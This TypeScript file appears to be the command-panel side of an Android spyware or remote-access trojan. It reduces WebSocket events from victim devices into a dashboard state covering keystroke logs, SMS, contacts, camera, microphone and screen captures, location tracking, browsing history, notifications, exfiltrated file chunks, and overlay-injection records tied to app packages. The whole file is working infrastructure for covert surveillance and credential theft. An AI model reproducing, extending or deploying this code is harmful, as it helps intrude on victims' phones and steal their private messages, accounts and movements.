import type { WsEvent } from '#/composables/useWebSocket';

export interface SmsRecord {
  detail: string;
  number: string;
  text: string;
  time: string;
}

export interface ContactRecord {
  name: string;
  number: string;
}

export interface AppRecord {
  icon?: string;
  name: string;
  packageName: string;
}

export interface FileRecord {
  lastModified: string;
  name: string;
  path: string;
  size: string;
}

export interface NotifyRecord {
  app: string;
  text: string;
  time: string;
}

export interface ActivityRecord {
  name: string;
  packageName: string;
}

export interface BrowsRecord {
  title: string;
  url: string;
}

export interface InjectRecord {
  htmlName: string;
  packageName: string;
  logText: string;
}

export interface LocData {
  lat: string;
  lon: string;
  address?: string;
}

export interface DownChunk {
  chunkNumber: number;
  filedata: string;
  filehash: string;
  filename: string;
  filepath: string;
  sentSize: string;
  totalSize: string;
}

export interface DeviceEventState {
  activities: ActivityRecord[];
  apps: AppRecord[];
  browseHistory: BrowsRecord[];
  cameraImage: string;
  contacts: ContactRecord[];
  files: FileRecord[];
  injectRecords: InjectRecord[];
  keylogs: string[];
  lastLocation: LocData | null;
  locationHistory: LocData[];
  micData: string;
  notifications: NotifyRecord[];
  screenImage: string;
  screenSize: null | { height: number; width: number };
  screenshotImage: string;
  screenshotSize: null | { height: number; width: number };
  searchResults: string[];
  sms: SmsRecord[];
  downloadChunks: DownChunk[];
  thumbnails: Record<string, string>;
  proxyState: null | Record<string, unknown>;
  chatMessages: Array<{ data: string; time: string }>;
}

export function createDeviceEventState(): DeviceEventState {
  return {
    activities: [],
    apps: [],
    browseHistory: [],
    cameraImage: '',
    contacts: [],
    files: [],
    injectRecords: [],
    keylogs: [],
    lastLocation: null,
    locationHistory: [],
    micData: '',
    notifications: [],
    screenImage: '',
    screenSize: null,
    screenshotImage: '',
    screenshotSize: null,
    searchResults: [],
    sms: [],
    downloadChunks: [],
    thumbnails: {},
    proxyState: null,
    chatMessages: [],
  };
}

export function reduceDeviceEvent(
  state: DeviceEventState,
  event: WsEvent,
): DeviceEventState {
  const next = cloneState(state);
  switch (event.type) {
    case 'activz': {
      next.activities = parseActivities(text(event.data));
      break;
    }
    case 'brows': {
      next.browseHistory = parseBrows(text(event.data));
      break;
    }
    case 'cam': {
      next.cameraImage = imageData(event.data);
      break;
    }
    case 'chat': {
      const msg = text(event.data);
      if (msg) {
        next.chatMessages = [
          {
            data: msg,
            time: new Date().toLocaleTimeString('zh-CN', { hour12: false }),
          },
          ...next.chatMessages,
        ].slice(0, 200);
      }
      break;
    }
    case 'down': {
      const chunk = parseDownChunk(event);
      if (chunk)
        next.downloadChunks = [...next.downloadChunks, chunk].slice(-50);
      break;
    }
    case 'files': {
      next.files = parseFiles(text(event.data));
      break;
    }
    case 'injapps': {
      next.injectRecords = parseInjectRecords(text(event.data));
      break;
    }
    case 'klog': {
      const value = text(event.data);
      if (value)
        next.keylogs = [
          `[${new Date().toLocaleTimeString('zh-CN', { hour12: false })}] ${value}`,
          ...next.keylogs,
        ].slice(0, 200);
      break;
    }
    case 'klogsdate': {
      next.keylogs = text(event.data)
        .split('>')
        .map((item) => item.trim())
        .filter(Boolean);
      break;
    }
    case 'loadapps': {
      next.apps = parseApps(text(event.data));
      break;
    }
    case 'loadcontacts': {
      next.contacts = parseContacts(text(event.data));
      break;
    }
    case 'loc': {
      const loc = parseLocData(text(event.data));
      if (loc) {
        next.lastLocation = loc;
        next.locationHistory = [loc, ...next.locationHistory].slice(0, 50);
      }
      break;
    }
    case 'mic': {
      const micRaw = text(event.data);
      if (micRaw) next.micData = micRaw;
      break;
    }
    case 'notifys': {
      const item = parseNotification(event);
      if (item)
        next.notifications = [item, ...next.notifications].slice(0, 200);
      break;
    }
    case 'proxy': {
      next.proxyState = event as unknown as Record<string, unknown>;
      break;
    }
    case 'screen': {
      next.screenImage = imageData(event.data);
      next.screenSize = {
        height: numberOf(event.hmob),
        width: numberOf(event.wmob),
      };
      break;
    }
    case 'screenshot': {
      next.screenshotImage = imageData(event.data);
      next.screenshotSize = {
        height: numberOf(event.hmob),
        width: numberOf(event.wmob),
      };
      break;
    }
    case 'search':
    case 'srch': {
      const srchData = text(event.data);
      if (srchData) next.searchResults = srchData.split('\n').filter(Boolean);
      break;
    }
    case 'sms': {
      next.sms = parseSms(text(event.data));
      break;
    }
    case 'thumb': {
      const thumbPath = text(event.path);
      const thumbData = imageData(event.data);
      if (thumbPath && thumbData) {
        next.thumbnails = { ...next.thumbnails, [thumbPath]: thumbData };
      }
      break;
    }
  }
  return next;
}

function cloneState(state: DeviceEventState): DeviceEventState {
  return {
    activities: [...state.activities],
    apps: [...state.apps],
    browseHistory: [...state.browseHistory],
    cameraImage: state.cameraImage,
    contacts: [...state.contacts],
    files: [...state.files],
    injectRecords: [...state.injectRecords],
    keylogs: [...state.keylogs],
    lastLocation: state.lastLocation ? { ...state.lastLocation } : null,
    locationHistory: [...state.locationHistory],
    micData: state.micData,
    notifications: [...state.notifications],
    screenImage: state.screenImage,
    screenSize: state.screenSize ? { ...state.screenSize } : null,
    screenshotImage: state.screenshotImage,
    screenshotSize: state.screenshotSize ? { ...state.screenshotSize } : null,
    searchResults: [...state.searchResults],
    sms: [...state.sms],
    downloadChunks: [...state.downloadChunks],
    thumbnails: { ...state.thumbnails },
    proxyState: state.proxyState ? { ...state.proxyState } : null,
    chatMessages: [...state.chatMessages],
  };
}

function imageData(value: unknown) {
  const raw = text(value);
  if (!raw) return '';
  return raw.startsWith('data:') ? raw : `data:image/jpeg;base64,${raw}`;
}

function text(value: unknown) {
  // oxlint-disable-next-line eqeqeq -- intentional: checks both null and undefined
  return value == null ? '' : String(value);
}

function numberOf(value: unknown) {
  const n = Number(value);
  return Number.isFinite(n) ? n : 0;
}

function parseJsonLines<T>(
  value: string,
  mapper: (item: Record<string, unknown>) => T,
): T[] {
  return value
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter(Boolean)
    .flatMap((line) => {
      try {
        return [mapper(JSON.parse(line) as Record<string, unknown>)];
      } catch {
        return [];
      }
    });
}

function parseSms(value: string): SmsRecord[] {
  return parseJsonLines(value, (item) => ({
    detail: text(item.full_message || item.message),
    number: text(item.address || item.number),
    text: text(item.message),
    time: text(item.time),
  }));
}

function parseContacts(value: string): ContactRecord[] {
  return parseJsonLines(value, (item) => ({
    name: text(item.name),
    number: text(item.number || item.phone),
  }));
}

function parseApps(value: string): AppRecord[] {
  try {
    const payload = JSON.parse(value) as {
      apps?: Array<Record<string, unknown>>;
    };
    return (payload.apps || []).map((item) => ({
      icon: text(item.icon),
      name: text(item.name),
      packageName: text(item.packageName || item.package),
    }));
  } catch {
    return [];
  }
}

function parseActivities(value: string): ActivityRecord[] {
  return parseJsonLines(value, (item) => ({
    name: text(item.name || item.appName),
    packageName: text(item.packageName || item.package),
  }));
}

function parseNotification(event: WsEvent): NotifyRecord | null {
  const raw = text(event.data);
  if (!raw) return null;
  try {
    const obj = JSON.parse(raw) as Record<string, unknown>;
    return {
      app: text(obj.app || obj.packageName),
      text: text(obj.text || obj.message || obj.content),
      time: text(
        obj.time || new Date().toLocaleTimeString('zh-CN', { hour12: false }),
      ),
    };
  } catch {
    return {
      app: '',
      text: raw,
      time: new Date().toLocaleTimeString('zh-CN', { hour12: false }),
    };
  }
}

function parseBrows(value: string): BrowsRecord[] {
  return parseJsonLines(value, (item) => ({
    title: text(item.title),
    url: text(item.url || item.link),
  }));
}

function parseFiles(value: string): FileRecord[] {
  return value.split('[>D<]').flatMap((row) => {
    const parts = row.split('[>A<]');
    if (parts.length < 5) return [];
    return [
      {
        lastModified: parts[5] || '',
        name: parts[2] || '未知文件名',
        path: parts[4] || '',
        size: parts[3] || '',
      },
    ];
  });
}

function parseDownChunk(event: WsEvent): DownChunk | null {
  try {
    return {
      chunkNumber: Number(event.chunkNumber || 0),
      filedata: text(event.filedata),
      filehash: text(event.filehash),
      filename: text(event.filename),
      filepath: text(event.filepath),
      sentSize: text(event.sentSize),
      totalSize: text(event.totalSize),
    };
  } catch {
    return null;
  }
}

function parseInjectRecords(value: string): InjectRecord[] {
  return parseJsonLines(value, (item) => ({
    htmlName: text(item.htmlName || item.name || item.appName),
    packageName: text(item.packageName || item.package),
    logText: text(item.logText || item.log || ''),
  }));
}

function parseLocData(value: string): LocData | null {
  if (!value || value === 'null') return null;
  try {
    const obj = JSON.parse(value) as Record<string, unknown>;
    return {
      lat: text(obj.lat || obj.latitude),
      lon: text(obj.lon || obj.longitude),
      address: text(obj.address || obj.addr),
    };
  } catch {
    // Try comma-separated: "lat,lon"
    const parts = value.split(',');
    if (parts.length >= 2) {
      return { lat: parts[0]?.trim() ?? '', lon: parts[1]?.trim() ?? '' };
    }
    return null;
  }
}
